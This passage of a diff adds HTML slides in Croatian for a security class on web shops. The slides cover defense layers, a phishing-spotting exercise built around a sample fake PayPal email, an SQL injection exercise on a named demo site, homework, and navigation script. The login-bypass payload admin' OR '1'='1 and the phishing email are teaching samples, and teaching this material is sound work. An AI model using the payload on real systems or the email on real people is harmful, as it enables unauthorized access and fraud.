+            Napadač mora probiti SVE layere!</p>
+        </div>
+
+        <h3>Sigurnosni layeri za web shop:</h3>
+
+        <div class="security-layer">
+            <div class="layer-number">1</div>
+            <h4 style="margin-left: 50px;">Perimeter Security</h4>
+            <p style="margin-left: 50px;">• Firewall<br>
+            • DDoS protection (Cloudflare)<br>
+            • VPN za zaposlenike<br>
+            • Intrusion Detection System (IDS)</p>
+        </div>
+
+        <div class="security-layer">
+            <div class="layer-number">2</div>
+            <h4 style="margin-left: 50px;">Network Security</h4>
+            <p style="margin-left: 50px;">• Network segmentation<br>
+            • Internal firewall-i<br>
+            • WiFi security (WPA3)<br>
+            • Zero Trust architecture</p>
+        </div>
+
+        <div class="security-layer">
+            <div class="layer-number">3</div>
+            <h4 style="margin-left: 50px;">Application Security</h4>
+            <p style="margin-left: 50px;">• Input validation (protiv SQL injection)<br>
+            • Output encoding (protiv XSS)<br>
+            • HTTPS (SSL/TLS)<br>
+            • Security headers<br>
+            • WAF (Web Application Firewall)</p>
+        </div>
+
+        <div class="security-layer">
+            <div class="layer-number">4</div>
+            <h4 style="margin-left: 50px;">Data Security</h4>
+            <p style="margin-left: 50px;">• Encryption at rest (baza enkriptirana)<br>
+            • Encryption in transit (HTTPS)<br>
+            • Tokenization (kreditne kartice)<br>
+            • Backup & disaster recovery</p>
+        </div>
+
+        <div class="security-layer">
+            <div class="layer-number">5</div>
+            <h4 style="margin-left: 50px;">Endpoint Security</h4>
+            <p style="margin-left: 50px;">• Antivirus<br>
+            • Device encryption<br>
+            • Patch management<br>
+            • Mobile Device Management (MDM)</p>
+        </div>
+
+        <div class="security-layer">
+            <div class="layer-number">6</div>
+            <h4 style="margin-left: 50px;">User Security</h4>
+            <p style="margin-left: 50px;">• Strong passwords + 2FA<br>
+            • Security awareness training<br>
+            • Principle of Least Privilege<br>
+            • Regular access reviews</p>
+        </div>
+    </div>
+
+    <!-- Slide 14: Praktična vježba -->
+    <div class="slide">
+        <h2>🔧 Praktična vježba</h2>
+        
+        <div class="highlight">
+            <h3>💻 Zadatak 1: Identificiraj phishing</h3>
+            <p>Analiziraj sljedeći email i nađi SVE red flagove:</p>
+        </div>
+
+        <div class="case-study">
+            <p style="font-family: monospace; background: white; padding: 20px; border-radius: 10px;">
+            From: security@paypa1-center.com<br>
+            Subject: URGENT: Your PayPal Account Will Be Closed!<br>
+            <br>
+            Dear Valued Customer,<br>
+            <br>
+            We have detected unusual activity on your PayPal account from IP address in Nigeria. Your account will be permanently suspended within 24 hours unless you verify your identity immediately.<br>
+            <br>
+            Click here to verify now: http://paypal-security-verify.tk/login.php<br>
+            <br>
+            Failure to comply will result in account termination and legal action.<br>
+            <br>
+            Best regards,<br>
+            PayPal Security Team
+            </p>
+        </div>
+
+        <p><strong>Koliko red flagova možete pronaći? (Minimum 8!)</strong></p>
+
+        <div class="highlight" style="margin-top: 30px;">
+            <h3>💻 Zadatak 2: SQL Injection test</h3>
+            <p>Posjetite: <strong>https://demo.testfire.net</strong> (legalni test site)<br>
+            Pokušajte SQL injection na login formi.<br>
+            <br>
+            <strong>Testne kombinacije:</strong><br>
+            • Username: <code>admin' OR '1'='1</code><br>
+            • Password: <code>bilo što</code><br>
+            <br>
+            Jeste li se uspjeli ulogirati? Zašto/zašto ne?</p>
+        </div>
+
+        <div class="highlight" style="margin-top: 30px;">
+            <h3>💻 Zadatak 3: HTTPS provjera</h3>
+            <p>1. Otvorite bilo koji web shop<br>
+            2. Kliknite na lokot 🔒 u address baru<br>
+            3. Provjerite SSL certifikat<br>
+            4. Odgovorite:<br>
+            • Tko je izdao certifikat?<br>
+            • Kada ističe?<br>
+            • Je li TLS 1.2 ili 1.3?</p>
+        </div>
+    </div>
+
+    <!-- Slide 15: Domaća zadaća -->
+    <div class="slide">
+        <h2>📚 Domaća zadaća</h2>
+        
+        <div class="highlight">
+            <h3>📝 Zadatak: Analiza sigurnosnih prijetnji za web shop</h3>
+            <p>Napišite izvještaj o sigurnosnim prijetnjama za fiktivni e-commerce web shop.</p>
+        </div>
+
+        <h3>Struktura zadaće:</h3>
+
+        <div class="case-study">
+            <h4>1. Identifikacija prijetnji (30%)</h4>
+            <p>Navedite i opišite 5 najvećih prijetnji za vaš web shop:<br>
+            • Koju vrstu napada predstavljaju?<br>
+            • Kako bi mogli ugroziti shop?<br>
+            • Kolika je vjerojatnost (niska/srednja/visoka)?<br>
+            • Koliki bi bio utjecaj?</p>
+        </div>
+
+        <div class="case-study">
+            <h4>2. Risk Assessment matrica (20%)</h4>
+            <p>Napravite tablicu s:<br>
+            • Prijetnja<br>
+            • Vjerojatnost (1-5)<br>
+            • Utjecaj (1-5)<br>
+            • Risk Score (Vjerojatnost × Utjecaj)<br>
+            • Prioritet (Visok/Srednji/Nizak)</p>
+        </div>
+
+        <div class="case-study">
+            <h4>3. Case Study analiza (25%)</h4>
+            <p>Odaberite jedan breach (Target ili Equifax):<br>
+            • Što se dogodilo?<br>
+            • Koji security layeri su faila li?<br>
+            • Kako se moglo spriječiti?<br>
+            • Što bi vi napravili drugačije?</p>
+        </div>
+
+        <div class="case-study">
+            <h4>4. Defense strategija (25%)</h4>
+            <p>Za svaku identificiranu prijetnju:<br>
+            • Koje mjere zaštite implementirati?<br>
+            • Koje alate koristiti?<br>
+            • Koliko bi koštalo?<br>
+            • Timeline za implementaciju</p>
+        </div>
+
+        <p style="margin-top: 30px; font-size: 1.3em;"><strong>Format:</strong> Word/PDF<br>
+        <strong>Duljina:</strong> 5-7 stranica<br>
+        <strong>Rok:</strong> 1 tjedan<br>
+        <strong>Bodovi:</strong> Max 20 bodova</p>
+    </div>
+
+    <!-- Slide 16: Što slijedi? -->
+    <div class="slide">
+        <h2>🎯 Što nas čeka sljedeći tjedan?</h2>
+        
+        <h3>📅 Tjedan 14: Zaštita i best practices</h3>
+        <ul style="font-size: 1.3em; line-height: 2;">
+            <li>🔐 <strong>Encryption:</strong> Symmetric vs Asymmetric, AES, RSA</li>
+            <li>🔑 <strong>Authentication:</strong> Passwords, 2FA, biometrija</li>
+            <li>🎫 <strong>Authorization:</strong> RBAC, OAuth, JWT</li>
+            <li>🔒 <strong>HTTPS & SSL/TLS:</strong> Kako radi enkripcija</li>
+            <li>💳 <strong>PCI DSS:</strong> Standardi za payment sigurnost</li>
+            <li>📜 <strong>GDPR:</strong> Pravna regulativa, kazne</li>
+        </ul>
+
+        <div class="case-study" style="margin-top: 40px;">
+            <h3>📖 Za čitanje kroz tjedan:</h3>
+            <p><strong>Article:</strong> "How HTTPS works" (howhttps.works)<br>
+            <strong>Video:</strong> "Encryption explained" (YouTube - Computerphile)<br>
+            <strong>Dokumentacija:</strong> OWASP Top 10 (owasp.org/www-project-top-ten/)</p>
+        </div>
+
+        <div class="warning-box" style="margin-top: 30px;">
+            <h3>⚠️ VAŽNO za sljedeći tjedan:</h3>
+            <p>Donijet ćemo laptope - praktične vježbe s enkripcijom!<br>
+            Instalirajte:<br>
+            • VeraCrypt (file encryption)<br>
+            • Authy/Google Authenticator (2FA app)</p>
+        </div>
+
+        <p style="margin-top: 50px; font-size: 1.5em; text-align: center;">Vidimo se sljedeći tjedan! 🔐</p>
+    </div>
+</div>
+
+<div class="slide-counter">
+    <span id="current">1</span> / <span id="total">16</span>
+</div>
+
+<div class="navigation">
+    <button class="nav-btn" onclick="prevSlide()">← Prethodni</button>
+    <button class="nav-btn" onclick="nextSlide()">Sljedeći →</button>
+</div>
+
+<script>
+    let currentSlide = 0;
+    const slides = document.querySelectorAll('.slide');
+    const total = slides.length;
+    
+    document.getElementById('total').textContent = total;
+
+    function showSlide(n) {
+        slides[currentSlide].classList.remove('active');
+        currentSlide = (n + total) % total;
+        slides[currentSlide].classList.add('active');
+        document.getElementById('current').textContent = currentSlide + 1;
+    }
+
+    function nextSlide() {
+        showSlide(currentSlide + 1);
+    }
+
+    function prevSlide() {
+        showSlide(currentSlide - 1);
+    }
+
+    document.addEventListener('keydown', function(e) {
+        if (e.key === 'ArrowRight') nextSlide();
+        if (e.key === 'ArrowLeft') prevSlide();
+    });
+
+    let touchStartX = 0;
+    let touchEndX = 0;
+
+    document.addEventListener('touchstart', e => {
+        touchStartX = e.changedTouches[0].screenX;
+    });
+
+    document.addEventListener('touchend', e => {
+        touchEndX = e.changedTouches[0].screenX;
+        if (touchStartX - touchEndX > 50) nextSlide();
+        if (touchEndX - touchStartX > 50) prevSlide();
+    });
+</script>
+</body>
+</html>
+</artifact>
+
